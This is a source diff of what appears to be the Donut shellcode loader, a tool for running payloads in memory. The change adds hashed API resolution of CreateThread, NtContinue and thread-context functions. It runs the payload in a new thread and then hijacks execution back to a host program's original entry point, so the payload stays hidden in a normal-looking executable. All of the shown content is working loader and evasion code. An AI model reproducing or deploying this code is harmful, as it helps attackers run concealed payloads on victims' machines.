@@ -31,32 +31,69 @@
 
 #include "loader.h"
 
-DWORD MainProc(LPVOID lpParameter);
+DWORD MainProc(PDONUT_INSTANCE inst);
 
-HANDLE ThreadProc(LPVOID lpParameter) {
-    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
-    CreateThread_t  _CreateThread;
-    ULONG64         hash;
+HANDLE DonutLoader(PDONUT_INSTANCE inst) {
+    CreateThread_t     _CreateThread;
+    GetThreadContext_t _GetThreadContext;
+    GetCurrentThread_t _GetCurrentThread;
+    NtContinue_t       _NtContinue;
+    ULONG64            hash;
+    HANDLE             h = NULL;
+    CONTEXT            c;
     
+    // create a new thread for shellcode?
     if(inst->fork) {
-      DPRINT("Creating new thread");
+      DPRINT("Resolving address of CreateThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
-      if(_CreateThread == NULL) {
-        DPRINT("Failed!");
+      
+      // api resolved?
+      if(_CreateThread != NULL) {
+        // create new thread
+        DPRINT("Creating new thread");
+        h = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainProc, (LPVOID)inst, 0, NULL);
+      } else {
+        DPRINT("FAILED");
         return (HANDLE)-1;
       }
-      return _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainProc, lpParameter, 0, NULL);
+      
+      // execute original entrypoint?
+      if(inst->oep != 0) {
+        DPRINT("Resolving address of NtContinue");
+        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+        _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
+        
+        DPRINT("Resolving address of GetThreadContext");
+        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+        _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
+
+        DPRINT("Resolving address of GetCurrentThread");
+        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+        _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
+        
+        if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+          c.ContextFlags = CONTEXT_FULL;
+          _GetThreadContext(_GetCurrentThread(), &c);
+          #ifdef _WIN64
+            c.Rip = inst->oep;
+          #else
+            c.Eip = inst->oep;
+          #endif
+          DPRINT("Calling NtContinue");
+          _NtContinue(&c, FALSE);
+        }
+      }
     } else {
-      MainProc(lpParameter);
-      return NULL;
+      // execute in existing thread
+      MainProc(inst);
     }
+    return h;
 }
 
-DWORD MainProc(LPVOID lpParameter) {
+DWORD MainProc(PDONUT_INSTANCE inst) {
     ULONG                i, ofs, wspace, fspace, len;
     ULONG64              sig;
-    PDONUT_INSTANCE      inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY       assembly;
     PDONUT_MODULE        mod, unpck;
     VirtualAlloc_t       _VirtualAlloc;
@@ -104,7 +141,7 @@ DWORD MainProc(LPVOID lpParameter) {
       return -1;
     }
     DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
-    Memcpy(pv, lpParameter, inst->len);
+    Memcpy(pv, inst, inst->len);
     inst = (PDONUT_INSTANCE)pv;
     
     DPRINT("Zero initializing PDONUT_ASSEMBLY");
@@ -369,7 +406,7 @@ int main(int argc, char *argv[]) {
         printf("Running...");
       
         // run payload with instance
-        h = ThreadProc(inst);
+        h = DonutLoader(inst);
         
         if(h != (HANDLE)-1 && inst->fork) {
           printf("\nWaiting...");
